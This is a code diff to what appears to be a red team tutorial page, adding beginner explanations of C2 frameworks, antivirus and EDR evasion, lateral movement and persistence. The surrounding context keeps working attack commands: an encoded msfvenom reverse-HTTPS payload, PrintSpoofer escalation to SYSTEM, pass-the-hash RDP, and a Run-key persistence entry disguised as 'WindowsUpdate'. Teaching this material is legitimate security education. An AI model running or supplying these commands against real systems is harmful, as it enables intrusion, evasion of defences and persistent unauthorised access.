@@ -15,6 +15,12 @@ const H2 = ({ children }: { children: React.ReactNode }) => (
   </h2>
 )
 const P = ({ children }: { children: React.ReactNode }) => <p style={{ color: '#9a8a8a', lineHeight: 1.8, marginBottom: '1rem', fontSize: '0.9rem' }}>{children}</p>
+const Note = ({ children }: { children: React.ReactNode }) => (
+  <div style={{ background: 'rgba(255,51,51,0.05)', border: '1px solid rgba(255,51,51,0.2)', borderRadius: '6px', padding: '1rem 1.25rem', marginBottom: '1.5rem', marginTop: '0.5rem' }}>
+    <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#ff3333', letterSpacing: '0.15em', marginBottom: '6px' }}>BEGINNER NOTE</div>
+    <p style={{ color: '#8a9a9a', fontSize: '0.82rem', lineHeight: 1.7, margin: 0, fontFamily: 'sans-serif' }}>{children}</p>
+  </div>
+)
 
 export default function RedTeam() {
   return (
@@ -35,6 +41,7 @@ export default function RedTeam() {
       </div>
 
       <H2>01 — Red Team vs Pentest vs Bug Bounty</H2>
+      <P>Understanding the distinction between these three disciplines is important before studying red team techniques. Bug bounty programs reward finding individual bugs. Penetration tests assess the security posture of a system. Red team engagements simulate a real threat actor with a specific objective — testing whether defenders can detect and respond to a sophisticated, persistent attacker.</P>
       <Pre label="// UNDERSTANDING THE SPECTRUM">{`# Bug Bounty:
 # → Find individual vulnerabilities in specific scope
 # → Rewarded per valid finding
@@ -107,6 +114,8 @@ export default function RedTeam() {
 # - Remediation roadmap`}</Pre>
 
       <H2>03 — C2 Frameworks</H2>
+      <P>A Command and Control (C2) framework is the infrastructure that lets an attacker control malware on compromised systems. The implant (a program running on the victim) periodically calls back to the C2 server to receive commands and send results. Professional red teams use C2 to simulate Advanced Persistent Threats (APTs).</P>
+      <Note>Think of C2 like a remote control for malware. The implant on the victim's machine is like a sleeper agent: it periodically calls home over HTTPS (blending in with normal web traffic) and waits for instructions. When the attacker types a command on their server, it gets queued, picked up at next check-in, executed on victim, and results returned — all over encrypted channels.</Note>
       <Pre label="// COMMAND & CONTROL INFRASTRUCTURE">{`# What is C2?
 # Implant on victim machine phones home to your server
 # You send commands → implant executes → results returned
@@ -148,6 +157,8 @@ set LPORT 443
 run`}</Pre>
 
       <H2>04 — AV & EDR Evasion</H2>
+      <P>Antivirus software detects malware by matching files against a database of known bad signatures. EDR (Endpoint Detection and Response) is more sophisticated — it monitors behavior, looking for suspicious patterns like injecting code into processes or making unusual API calls. Red teamers must evade both to simulate real-world APTs.</P>
+      <Note>The arms race between malware and security software is constant. Signature-based detection (old-school AV) fails once attackers change a single byte. Behavioral detection (modern EDR) is much harder to evade because it watches what your code DOES, not what it looks like. Modern evasion focuses on looking like legitimate software behavior.</Note>
       <Pre label="// BYPASS ANTIVIRUS AND ENDPOINT DETECTION">{`# Why signatures fail:
 # AV works by matching known bad patterns (signatures)
 # Change the pattern → bypass signature detection
@@ -200,6 +211,7 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 \
   -f exe -e x64/xor_dynamic -i 5 -o payload.exe`}</Pre>
 
       <H2>05 — Internal Recon & Lateral Movement</H2>
+      <Note>Once inside a network, attackers do NOT immediately go for the crown jewels. They spend time quietly mapping the environment — finding domain controllers, understanding trust relationships, identifying where sensitive data lives. This patience is what distinguishes APTs from script kiddies. The longer they stay undetected, the deeper they can get.</Note>
       <Pre label="// MOVE THROUGH THE NETWORK LIKE AN APT">{`# Internal recon (from compromised host):
 # Network discovery:
 for /L %i in (1,1,254) do ping -n 1 -w 50 192.168.1.%i | find "TTL"
@@ -235,6 +247,7 @@ PrintSpoofer.exe -i -c cmd  # From low-priv service account → SYSTEM
 xfreerdp /u:admin /pth:NTLM_HASH /v:TARGET_IP  # RDP with hash`}</Pre>
 
       <H2>06 — Persistence Mechanisms</H2>
+      <P>Persistence means maintaining access to a system across reboots, log-offs, and security tool removal. Without persistence, losing a C2 connection means starting over. Persistence mechanisms range from simple (registry run keys) to sophisticated (WMI subscriptions, COM hijacking) — the more advanced ones are harder for defenders to find.</P>
       <Pre label="// MAINTAIN ACCESS ACROSS REBOOTS">{`# Registry Run Keys:
 reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \
   /v WindowsUpdate /t REG_SZ /d "C:\\Windows\\Temp\\beacon.exe"
